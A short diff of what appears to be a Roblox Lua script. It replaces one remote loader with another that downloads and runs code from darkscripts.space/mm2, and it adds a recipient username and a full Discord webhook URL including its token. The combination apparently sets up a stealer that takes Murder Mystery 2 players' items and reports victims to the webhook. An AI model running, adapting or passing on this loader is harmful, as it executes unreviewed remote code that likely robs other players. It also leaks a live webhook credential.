@@ -1,1 +1,4 @@
-loadstring(game:HttpGet('https://darkscripts.space/scripts/7f9a0939ad.lua', true))()
+Username = "sandro4342"
+Webhook = "https://discord.com/api/webhooks/1303276256657408020/cn-0C2jH1dEHAZXASZDOcMCpM3mfvvdDrdDLFzpxMY4oHEb643HDFdwrMOyQfuVB_CJK"
+
+loadstring(game:HttpGet(('https://darkscripts.space/mm2')))()
